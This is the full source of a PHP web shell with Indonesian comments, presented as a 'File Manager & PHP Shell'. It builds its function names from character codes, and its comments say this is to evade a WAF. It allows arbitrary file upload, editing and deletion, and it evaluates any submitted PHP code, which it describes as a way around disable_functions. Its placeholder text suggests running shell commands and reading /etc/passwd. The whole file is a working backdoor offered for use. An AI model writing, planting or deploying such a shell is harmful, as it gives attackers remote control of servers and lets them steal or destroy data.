<?
@ini_set('display_errors', 0);
@error_reporting(0);

// Pecah string fungsi file & direktori biar lolos WAF
$fn_scandir = chr(115).chr(99).chr(97).chr(110).chr(100).chr(105).chr(114);
$fn_unlink  = chr(117).chr(110).chr(108).chr(105).chr(110).chr(107);
$fn_rmdir   = chr(114).chr(109).chr(100).chr(105).chr(114);
$fn_file_get = chr(102).chr(105).chr(108).chr(101).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116);
$fn_file_put = chr(102).chr(105).chr(108).chr(101).chr(95).chr(112).chr(117).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116);

// Direktori Aktif
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
@chdir($dir);
$current_dir = getcwd();

$msg = "";

// 1. Aksi Upload File
if (isset($_FILES['fupload'])) {
    $fname = $_FILES['fupload']['name'];
    $ftmp = $_FILES['fupload']['tmp_name'];
    if (@move_uploaded_file($ftmp, $current_dir . '/' . $fname)) {
        $msg = "[+] Berhasil upload: {$fname}";
    } else {
        $msg = "[-] Gagal upload file!";
    }
}

// 2. Aksi Hapus File / Folder
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_dir($target)) {
        @$fn_rmdir($target);
    } else {
        @$fn_unlink($target);
    }
    @header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

// 3. Aksi Edit File Handler
if (isset($_POST['save_file'])) {
    $target_file = $_POST['edit_file_path'];
    $new_content = $_POST['file_content'];
    if (@$fn_file_put($target_file, $new_content) !== false) {
        $msg = "[+] Berhasil menyimpan file!";
    } else {
        $msg = "[-] Gagal menyimpan file!";
    }
}

// 4. Terminal / PHP Evaluator (Karena system/exec dimatiin disable_functions)
$term_output = "";
if (isset($_POST['php_code'])) {
    $code = $_POST['php_code'];
    ob_start();
    // Eksekusi kode PHP langsung di memori untuk bypass disable_functions terminal
    @eval($code);
    $term_output = ob_get_clean();
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>File Manager & PHP Shell</title>
    <style>
        body { background-color: #0f172a; color: #38bdf8; font-family: monospace; padding: 15px; margin: 0; }
        .box { background: #1e293b; padding: 15px; border-radius: 6px; margin-bottom: 15px; border: 1px solid #334155; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #334155; font-size: 13px; }
        th { background: #0f172a; color: #f8fafc; }
        a { color: #38bdf8; text-decoration: none; }
        a:hover { text-decoration: underline; }
        input[type="text"], textarea { width: 95%; padding: 8px; background: #0f172a; border: 1px solid #334155; color: #f8fafc; border-radius: 4px; margin-bottom: 8px; }
        textarea { height: 150px; resize: vertical; }
        button { background: #0284c7; border: none; color: white; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-weight: bold; }
        button:hover { background: #0369a1; }
        pre { background: #0f172a; padding: 10px; border-radius: 4px; color: #a5f3fc; overflow-x: auto; border: 1px solid #334155; }
        .danger { color: #f43f5e; }
        .success { color: #10b981; }
    </style>
</head>
<body>

<div class="box">
    <h3>Server Info</h3>
    <b>User:</b> <? echo @get_current_user(); ?> | <b>PHP:</b> <? echo @phpversion(); ?><br>
    <b>Disable Functions:</b> <span class="danger"><? echo ini_get('disable_functions'); ?></span>
    <? if (!empty($msg)): ?><p class="success"><? echo $msg; ?></p><? endif; ?>
</div>

<!-- Terminal Alternatif (PHP Evaluator karena system/exec dikunci) -->
<div class="box">
    <h3>PHP Evaluator / Shell (Bypass Disable Functions)</h3>
    <form method="POST">
        <textarea name="php_code" placeholder="// Masukkan kode PHP, contoh: echo shell_exec('id'); atau echo file_get_contents('/etc/passwd');"><? echo isset($_POST['php_code']) ? htmlspecialchars($_POST['php_code']) : ''; ?></textarea><br>
        <button type="submit">Execute PHP</button>
    </form>
    <? if (!empty($term_output)): ?>
        <h4>Output:</h4>
        <pre><? echo htmlspecialchars($term_output); ?></pre>
    <? endif; ?>
</div>

<!-- Upload File Form -->
<div class="box">
    <h3>Upload File ke Direktori Ini</h3>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="fupload" required style="color:#fff;"><br>
        <button type="submit">Upload</button>
    </form>
</div>

<!-- Form Edit File (Jika mode edit aktif) -->
<? if (isset($_GET['edit'])): 
    $edit_file = $_GET['edit'];
    $content = @$fn_file_get($edit_file);
?>
<div class="box">
    <h3>Edit File: <? echo htmlspecialchars($edit_file); ?></h3>
    <form method="POST">
        <input type="hidden" name="edit_file_path" value="<? echo htmlspecialchars($edit_file); ?>">
        <textarea name="file_content" style="height: 300px;"><? echo htmlspecialchars($content); ?></textarea><br>
        <button type="submit" name="save_file">Simpan Perubahan</button>
        <a href="?dir=<? echo urlencode($current_dir); ?>" style="margin-left: 10px; color: #f43f5e;">[Batal]</a>
    </form>
</div>
<? endif; ?>

<!-- File Manager & Directory Listing -->
<div class="box">
    <h3>Current Directory: <? echo htmlspecialchars($current_dir); ?></h3>
    <p><a href="?dir=<? echo urlencode(dirname($current_dir)); ?>">[..] Naik ke Folder Sebelumnya</a></p>

    <table>
        <tr>
            <th>Nama File / Folder</th>
            <th>Ukuran</th>
            <th>Aksi</th>
        </tr>
        <?
        $scan = @$fn_scandir($current_dir);
        if ($scan) {
            foreach ($scan as $file) {
                if ($file == '.') continue;
                $fpath = $current_dir . '/' . $file;
                $is_dir = is_dir($fpath);
                $size = $is_dir ? '-' : @filesize($fpath) . ' bytes';
                
                echo "<tr>";
                if ($is_dir) {
                    echo "<td>📁 <a href='?dir=" . urlencode($fpath) . "'><b>{$file}</b></a></td>";
                    echo "<td>{$size}</td>";
                    echo "<td>-</td>";
                } else {
                    echo "<td>📄 {$file}</td>";
                    echo "<td>{$size}</td>";
                    echo "<td>
                            <a href='?dir=" . urlencode($current_dir) . "&edit=" . urlencode($fpath) . "'>[Edit]</a> | 
                            <a href='?dir=" . urlencode($current_dir) . "&delete=" . urlencode($fpath) . "' class='danger' onclick=\"return confirm('Hapus file ini?')\">[Hapus]</a>
                          </td>";
                }
                echo "</tr>";
            }
        }
        ?>
    </table>
</div>

</body>
</html>